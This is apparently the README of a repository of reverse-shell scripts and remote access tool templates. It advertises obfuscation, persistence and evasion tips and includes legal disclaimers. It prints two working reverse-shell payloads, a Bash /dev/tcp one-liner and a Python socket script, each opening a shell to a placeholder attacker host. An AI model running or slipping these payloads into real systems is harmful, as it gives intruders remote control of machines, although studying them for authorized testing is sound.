# shell-shript

## Overview

**shell-shript** is a repository dedicated to reverse shell scripting, with a focus on code and techniques for building Remote Access Tools (RATs). It serves as a resource for learning, experimenting, and developing scripts to establish reverse shells, which are commonly used in penetration testing, security research, and for understanding remote administration technologies.

> **Disclaimer:**  
> This repository is intended for educational purposes, penetration testing, and research only. Unauthorized use of these scripts against systems you do not own or have explicit permission to test is strictly prohibited.

---

## Features

- Example reverse shell scripts in various languages (e.g., Bash, Python, Perl, etc.)
- Templates for building custom RATs
- Explanations of how reverse shells work
- Tips for obfuscation, persistence, and evasion (for authorized testing!)
- Guides for safe and legal usage

---

## Getting Started

1. **Clone the repository:**
   ```bash
   git clone https://github.com/Nithin-3/shell-shript.git
   cd shell-shript
   ```

2. **Explore the scripts:**
   - Browse the available scripts in language-specific folders or files.
   - Read comments and documentation within each script for usage instructions.

3. **Test in a controlled environment:**
   - Set up a local virtual machine or a lab for safe script execution.
   - Always ensure you have explicit authorization before using these tools on any network or device.

---

## Example: Bash Reverse Shell

```bash
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
```

## Example: Python Reverse Shell

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker_ip",port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; subprocess.call(["/bin/sh","-i"])
```

---

## Contribution

Contributions are welcome! Please submit pull requests for new scripts, improvements, or documentation. Always include clear comments and usage instructions.

---

## Legal Notice

This project is for educational and authorized penetration testing use ONLY.  
**Using these scripts on systems without explicit permission is illegal and unethical.**

---

## License

This project is licensed under the [MIT License](LICENSE).

---
